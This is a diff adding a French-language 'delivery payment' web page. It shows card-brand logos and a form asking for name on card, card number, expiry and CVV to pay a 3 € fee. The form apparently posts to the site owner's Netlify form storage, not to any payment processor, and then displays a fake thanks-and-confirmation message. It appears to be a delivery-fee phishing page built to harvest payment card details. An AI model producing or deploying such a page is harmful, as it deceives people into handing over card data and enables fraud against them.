@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Paiement de livraison</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #f1f1f1;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      background: #fff;
+      padding: 30px 20px;
+      width: 100%;
+      max-width: 450px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    .card-icons {
+      margin-bottom: 10px;
+    }
+    .card-icons img {
+      height: 30px;
+      margin: 0 5px;
+    }
+    .input-icon {
+      position: relative;
+    }
+    .input-icon input {
+      width: 100%;
+      padding: 14px;
+      padding-right: 40px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    .input-icon img {
+      position: absolute;
+      top: 50%;
+      right: 12px;
+      transform: translateY(-50%);
+      height: 20px;
+      opacity: 0.6;
+      pointer-events: none;
+    }
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+    .row input {
+      flex: 1;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    button {
+      background: #007BFF;
+      color: #fff;
+      border: none;
+      width: 100%;
+      padding: 14px;
+      font-size: 17px;
+      border-radius: 6px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    .confirmation {
+      display: none;
+      margin-top: 20px;
+      color: green;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card-icons">
+      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="Mastercard">
+      <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
+      <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
+      <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover">
+      <img src="https://img.icons8.com/color/48/000000/jcb.png" alt="JCB">
+    </div>
+    <h2>Paiement de livraison</h2>
+    <form name="paiement" method="POST" data-netlify="true" onsubmit="showConfirmation(event)">
+      <input type="text" name="nom" placeholder="Nom sur la carte" required />
+      <div class="input-icon">
+        <input type="text" name="numero" placeholder="N° de carte" required />
+        <img src="https://cdn-icons-png.flaticon.com/512/633/633611.png" alt="carte">
+      </div>
+      <div class="row">
+        <input type="text" name="expiration" placeholder="MM/AA" required />
+        <input type="text" name="cvv" placeholder="CVV" required />
+      </div>
+      <button type="submit">Payer 3 €</button>
+    </form>
+    <div class="confirmation" id="confirmation">
+      ✅ Merci ! Votre code de confirmation vous sera envoyé sous peu.
+    </div>
+  </div>
+
+  <script>
+    function showConfirmation(e) {
+      e.preventDefault();
+      document.querySelector("form").style.display = "none";
+      document.getElementById("confirmation").style.display = "block";
+    }
+  </script>
+</body>
+</html>
